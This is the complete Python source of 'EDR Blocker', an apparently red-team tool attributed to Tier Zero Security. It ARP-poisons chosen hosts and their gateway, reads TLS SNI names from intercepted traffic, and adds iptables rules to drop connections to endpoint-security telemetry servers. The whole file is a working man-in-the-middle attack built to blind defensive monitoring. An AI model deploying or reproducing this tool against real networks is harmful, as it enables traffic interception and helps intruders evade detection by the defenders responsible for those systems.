from scapy.all import *
from scapy.layers.tls.all import *
import subprocess
import argparse
import logging
import time
import os
import signal

# ASCII art for "EDR Blocker"
print(r"""
 ______   _____    ______       ______   __       ______   ______   __  __   ______   ______
/\  ___\ /\  __-. /\  == \     /\  == \ /\ \     /\  __ \ /\  ___\ /\ \/ /  /\  ___\ /\  == \
\ \  __\ \ \ \/\ \\ \  __<     \ \  __< \ \ \____\ \ \/\ \\ \ \____\ \  _"-.\ \  __\ \ \  __<
 \ \_____\\ \____- \ \_\ \_\    \ \_____\\ \_____\\ \_____\\ \_____\\ \_\ \_\\ \_____\\ \_\ \_\
  \/_____/ \/____/  \/_/ /_/     \/_____/ \/_____/ \/_____/ \/_____/ \/_/\/_/ \/_____/ \/_/ /_/

                                                            by Tier Zero Security - New Zealand
""")

GREEN = '\033[92m'
YELLOW = '\033[93m'
ENDC = '\033[0m'

def read_block_list(file_path):
    with open(file_path, 'r') as f:
        return f.read().splitlines()

def add_iptables_rule(ip, monitor_mode, server_name):
    if monitor_mode:
        logging.info(f"Blocked server name found: {server_name}")
        logging.info(f"{YELLOW}[+] Detected blocked IP: {ip}{ENDC}")
    else:
        try:
            rule_exists = subprocess.call(f"iptables -C FORWARD -d {ip} -j DROP  > /dev/null 2>&1", shell=True)
            if rule_exists != 0:
                subprocess.call(f"iptables -A FORWARD -d {ip} -j DROP", shell=True)
                logging.info(f"Blocked server name found: {server_name}")
                logging.info(f"{GREEN}[+] iptables rule added for: {ip}{ENDC}")
        except Exception as e:
            logging.error(f"Failed to add iptables rule for {ip}: {str(e)}")

def process_packet(packet, blocked_domains, monitor_mode):
    try:
        if packet.haslayer(TLSClientHello):
            client_hello = packet[TLSClientHello]
            for ext in client_hello.ext:
                try:
                    if hasattr(ext, 'servernames'):
                        server_name = ext.servernames[0].servername.decode('utf-8')
                        logging.debug(f"Received SNI: {server_name}")
                        logging.debug(f"Destination IP: {packet[IP].dst}")

                        for domain in blocked_domains:
                            if domain in server_name:
                                add_iptables_rule(packet[IP].dst, monitor_mode, server_name)
                                break
                except Exception as e:
                    continue
    except Exception as e:
        logging.error(f"An error occurred while processing packet: {str(e)}")

def get_mac(ip, iface):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, iface=iface, verbose=False)[0]

    for sent, received in answered_list:
        return received.hwsrc
    return None

def spoof(target_ip, spoof_ip, iface):
    target_mac = get_mac(target_ip, iface)
    if target_mac is None:
        logging.error(f"Failed to get MAC address for IP {target_ip}")
        return
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=get_if_hwaddr(iface))
    send(arp_response, iface=iface, verbose=False)
    #logging.debug(f"Sent ARP reply: {spoof_ip} is at {get_if_hwaddr(iface)} to {target_ip}")

def restore(target_ip, spoof_ip, iface):
    target_mac = get_mac(target_ip, iface)
    spoof_mac = get_mac(spoof_ip, iface)
    if target_mac is None or spoof_mac is None:
        logging.error(f"Failed to get MAC address for IP {target_ip} or {spoof_ip}")
        return
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    send(arp_response, iface=iface, count=4, verbose=False)
    logging.info(f"Restored ARP table for {target_ip}")
    subprocess.call(f"iptables -F", shell=True)
    logging.info(f"Cleared iptables rules")

def parse_targets(targets):
    if '-' in targets:
        start_ip, end_ip = targets.split('-')
        start_ip = int(start_ip.split('.')[-1])
        end_ip = int(end_ip.split('.')[-1])
        base_ip = '.'.join(targets.split('.')[:-1])
        return [f"{base_ip}.{i}" for i in range(start_ip, end_ip + 1)]
    elif ',' in targets:
        return targets.split(',')
    else:
        return [targets]

def enable_ip_forwarding():
    ip_forward = subprocess.check_output("sysctl -n net.ipv4.ip_forward", shell=True).strip().decode()
    if ip_forward != "1":
        logging.error("IP forwarding is not enabled. Run 'sysctl -w net.ipv4.ip_forward=1' to enable packet forwarding.")
        exit(1)

def signal_handler(sig, frame):
    logging.info("Restoring ARP tables...")
    for target in targets:
        restore(target, args.gateway, args.interface)
    logging.info("ARP tables restored. Exiting.")
    os._exit(0)

def main():
    parser = argparse.ArgumentParser(description="Performs ARP Poisoning against victim host(s) and blocks EDR telemetry by utilising iptables.")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to sniff on")
    parser.add_argument("-f", "--file", required=True, help="File containing the list of blocked server names or a part of names")
    parser.add_argument("-m", "--monitor", action="store_true", help="Monitor mode: only detect and log blocked IPs, do not add iptables rules")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("-t", "--target", required=True, help="Target IP address or range (e.g., 192.168.0.1-10 or 192.168.0.1,192.168.0.2 (no space)")
    parser.add_argument("-gw", "--gateway", required=True, help="Gateway IP address")

    global args, targets
    args = parser.parse_args()
    blocked_domains = read_block_list(args.file)
    targets = parse_targets(args.target)

    if args.verbose:
        logging.basicConfig(level=logging.DEBUG)
    else:
        logging.basicConfig(level=logging.INFO)

    logging.info(f"Blocked server name strings {blocked_domains}")
    logging.info("Running EDR telemetry filtering...")

    enable_ip_forwarding()

    signal.signal(signal.SIGINT, signal_handler)

    # Use AsyncSniffer for asynchronous sniffing
    sniffer = AsyncSniffer(
        iface=args.interface,
        prn=lambda pkt: process_packet(pkt, blocked_domains, args.monitor),
        filter="tcp port 443",
        store=False
    )

    sniffer.start()  # Start the sniffer asynchronously
    try:
        while True:
            for target in targets:
                spoof(target, args.gateway, args.interface)
            time.sleep(1)
    except KeyboardInterrupt:
        sniffer.stop()  # Stop the sniffer on interrupt

if __name__ == "__main__":
    main()
